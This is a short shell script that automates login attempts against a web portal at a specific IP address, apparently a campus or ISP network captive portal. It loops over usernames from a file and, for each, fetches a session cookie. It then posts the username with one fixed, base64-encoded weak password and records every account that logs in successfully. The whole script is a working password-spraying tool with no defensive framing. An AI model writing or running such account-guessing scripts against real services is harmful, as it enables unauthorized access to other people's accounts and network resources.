#!/bin/sh

namelist=`cat name.txt`
for name in $namelist
do
rm -fr cookie*
request_url=http://222.24.19.190:8080/portal/index_default.jsp
logurl=http://222.24.19.190:8080/portal
post_info="userName=$name&userPwd=MTExMTEx"

curl -s -c cookie.txt  -A Mozilla/5.0 -H "Accept-Language:zh-CN" $request_url &> /dev/null 
curl -s -b cookie.txt  -A Mozilla/5.0 -H "Accept-Language:zh-CN" -H "Referer:$request_url" -d $post_info "$logurl/pws?t=li"  > truncate.txt

result=`cat truncate.txt  |grep heartBeatCyc`
if [ $? == 0 ]
then
	echo "$name :login succeed!"
	echo $name >> vaild_name.txt
else
	echo "$name :login failed!"
fi

done
